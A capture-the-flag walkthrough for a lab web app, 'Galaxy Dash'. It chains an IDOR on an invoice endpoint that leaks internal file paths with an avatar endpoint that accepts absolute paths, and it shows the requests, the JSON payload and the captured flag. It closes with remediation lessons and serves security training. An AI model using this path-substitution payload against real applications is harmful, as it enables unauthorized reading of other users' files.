# Bug Forge Weekly CTF Walkthrough

## Challenge Overview

**Platform:** Bug Forge Weekly Lab  
**Application:** Galaxy Dash  
**Flag Format:** `bug{flag}`

### Hint

> You don't have ownership of the target file, but there might be another way to access it.

---

# Methodology

The challenge was solved by combining:

1. Frontend source code analysis
2. API enumeration
3. Authorization testing
4. IDOR discovery
5. Alternative file access path abuse

The core issue was an authorization inconsistency between booking and invoice endpoints, combined with a file access mechanism exposed through the organization avatar functionality.

---

# Step 1: Initial Reconnaissance

The application loaded as a React Single Page Application (SPA).

```bash
curl https://lab-1780771056845-gi1vk9.labs-app.bugforge.io/login
```

The response revealed a JavaScript bundle:

```html
/static/js/main.6c630545.js
```

The bundle and source map were downloaded for analysis.

```bash
curl -O https://target/static/js/main.6c630545.js
curl -O https://target/static/js/main.6c630545.js.map
```

---

# Step 2: Source Code Review

The source map exposed the original React source files.

Interesting components included:

- OrganizationSettings.js
- BookingDetails.js
- BookingForm.js
- Dashboard.js
- Header.js

During review, the organization avatar feature stood out because it accepted:

> An image URL or an absolute file path

This suggested a possible Local File Read or alternative file access vector.

---

# Step 3: Create a User Account

A new account was registered.

```bash
POST /api/auth/register
```

After login, the account received administrator privileges for its own organization.

This provided access to:

- Organization settings
- Avatar management
- Team management

---

# Step 4: Enumerate the API

Several endpoints were explored.

```http
GET /api/bookings
GET /api/invoices
GET /api/organization
```

Testing object access revealed a discrepancy.

### Booking Access

```http
GET /api/bookings/1
```

Result:

```json
{
  "error": "Booking not found"
}
```

The booking clearly did not belong to the current user.

---

# Step 5: Discover the IDOR

The invoice endpoint behaved differently.

```http
GET /api/invoices/1
```

Instead of denying access, it returned invoice metadata.

Example:

```json
{
  "invoice_number": "GD-2026-000001",
  "file_path": "/app/invoices/GD-2026-000001.txt"
}
```

This exposed an internal file path belonging to another user.

### Vulnerability

The application enforced ownership checks on bookings but failed to enforce them on invoices.

This created an IDOR (Insecure Direct Object Reference).

---

# Step 6: Attempt Direct File Access

The leaked file was requested directly.

```http
GET /api/files/GD-2026-000001.txt
```

Response:

```http
403 Forbidden
```

Direct access was blocked.

At this stage, the hint became important:

> You don't have ownership of the target file, but there might be another way to access it.

---

# Step 7: Abuse the Avatar Feature

The organization avatar endpoint accepted arbitrary absolute file paths.

```http
PUT /api/organization/avatar
```

Payload:

```json
{
  "avatar_url": "/app/invoices/GD-2026-000001.txt"
}
```

Response:

```json
{
  "message": "Avatar updated successfully"
}
```

The application accepted the invoice file path as an avatar source.

---

# Step 8: Access the File Through an Alternate Route

After updating the avatar path, the file became accessible through the avatar file handling flow.

Re-requesting the invoice file now returned its contents.

The file contained invoice information along with the flag.

---

# Flag

```text
bug{F6YwvYedcyajoKSujzxIfs6efBK6jcm1}
```

---

# Vulnerabilities Identified

## 1. IDOR on Invoice Endpoint

Affected endpoint:

```http
GET /api/invoices/{id}
```

Issue:

- Missing ownership validation
- Invoice metadata exposed to unauthorized users
- Internal file paths leaked

---

## 2. Arbitrary File Path Usage in Avatar Feature

Affected endpoint:

```http
PUT /api/organization/avatar
```

Issue:

- Accepted absolute filesystem paths
- Trusted user-supplied file locations
- Enabled alternate access to protected files

---

# Attack Chain Summary

1. Register a normal account.
2. Enumerate invoice IDs.
3. Access another user's invoice metadata.
4. Extract leaked `file_path` value.
5. Observe direct download is blocked.
6. Set the organization avatar to the leaked file path.
7. Retrieve the file through the avatar file access mechanism.
8. Extract the flag.

---

# Lessons Learned

- Object-level authorization must be enforced consistently across all related endpoints.
- Internal filesystem paths should never be exposed to clients.
- User-controlled file path parameters should be strictly validated.
- Alternative access paths often bypass protections implemented elsewhere in the application.

This challenge demonstrates how a seemingly harmless information disclosure can be chained with a second vulnerability to achieve unauthorized access to sensitive files.
